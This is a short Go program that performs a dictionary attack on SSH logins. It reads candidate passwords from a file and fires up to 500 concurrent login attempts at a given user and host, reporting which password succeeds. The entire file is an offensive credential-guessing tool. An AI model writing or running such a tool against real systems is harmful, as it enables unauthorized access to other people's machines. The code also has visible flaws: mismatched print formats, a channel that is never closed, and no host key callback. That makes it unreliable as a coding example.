package main

import (
	"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"
	"io"
	"log"
	"os"
	"strings"
)

func main() {
	if len(os.Args) != 4 {
		log.Fatalf("Usage: %s <dictionaries> <user> <host:port>", os.Args[0])
	}
	var maxCon int = 500
	// check dictionaries exists
	f, err := os.Open(os.Args[1])
	if err != nil && os.IsNotExist(err) {
		fmt.Print("dictionaries file not exists\n")
		return
	}
	defer f.Close()
	// 按行读取文件
	bdRd := bufio.NewReader(f)
	allChannel := make(chan bool, maxCon)
	var i int = 0
	for {
		line, err := bdRd.ReadBytes('\n')
		if err != nil {
			if err == io.EOF {
				fmt.Printf("end of file\n")
				break
			} else {
				panic(err)
			}
		}
		fmt.Printf("allChannel len:%d\n", i)
		if i > maxCon-1 {
			for ch := range allChannel {
				fmt.Printf("recieve:%d\n", ch)
				fmt.Printf("CURRENT i:%d\n", i)
				i--
				if i < maxCon/2 {
					break
				}
			}
		}
		go testConnectToHost(os.Args[2], os.Args[3], string(line), allChannel)
		i++
	}

	for i := range allChannel {
		fmt.Printf("ret:%s\n", i)
	}
}

func testConnectToHost(user, host, pass string, channel chan bool) (bool, error) {
	pass = strings.Trim(pass, "\n")
	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{ssh.Password(pass)},
	}

	client, err := ssh.Dial("tcp", host, sshConfig)
	if err != nil {
		fmt.Printf("%s:wrong\n", pass)
		channel <- false
		return false, err
	} else {
		fmt.Printf("%s:ok\n", pass)
		channel <- true
	}
	defer client.Close()
	return true, err
}
